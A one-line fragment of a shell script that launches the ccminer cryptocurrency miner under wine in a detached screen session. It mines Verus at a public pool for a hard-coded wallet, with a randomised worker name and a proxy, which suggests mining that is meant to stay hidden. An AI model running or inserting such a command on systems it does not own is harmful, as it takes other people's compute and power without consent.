...
screen -d -m bash -c "wine ccminer.exe -a verus -o stratum+tcp://na.luckpool.net:3956 -u RAxQVenbK9dxYRRta1n1CtBtRW1GydoUNk.$random_name -p d=8192S -t 4 --proxy=$proxy_url"
